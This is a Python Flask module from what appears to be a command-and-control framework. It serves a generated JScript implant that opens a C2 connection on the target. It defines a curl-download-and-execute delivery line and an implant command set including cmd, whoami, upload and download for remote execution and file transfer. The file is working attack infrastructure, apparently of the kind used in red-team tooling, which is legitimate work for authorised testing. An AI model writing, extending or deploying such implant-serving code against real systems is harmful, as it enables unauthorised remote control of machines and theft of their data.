from connect.server.models import db, ImplantModel
from connect.generate import digit_identifier, string_identifier
from flask import Blueprint, render_template, request

jscript = Blueprint('jscript', __name__, template_folder='resources')
endpoint = digit_identifier()
artifact = string_identifier()
delivery = f'curl ~endpoint~ -o {artifact}.js && {artifact}.js'
commands = 'delay,dir,hostname,whoami,os,cmd,delfile,download,upload'


@jscript.route(f'/{endpoint}', methods=['GET'])
def generate_implant():
    """
    jscript Route
    The jscript route expects a get request and will return an implant to be executed on the target(s) machine. The
    implant will attempt to establish a command and control connection to the framework.
    """

    implant = ImplantModel(commands=commands)
    db.session.add(implant)
    db.session.commit()

    # noinspection PyUnresolvedReferences
    return render_template('connect.js', check_in_uri=f"{request.host_url}", key=implant.key, sleep=implant.sleep,
                           jitter=implant.jitter, endpoints=implant.endpoints.split(','),
                           command_stdout=string_identifier())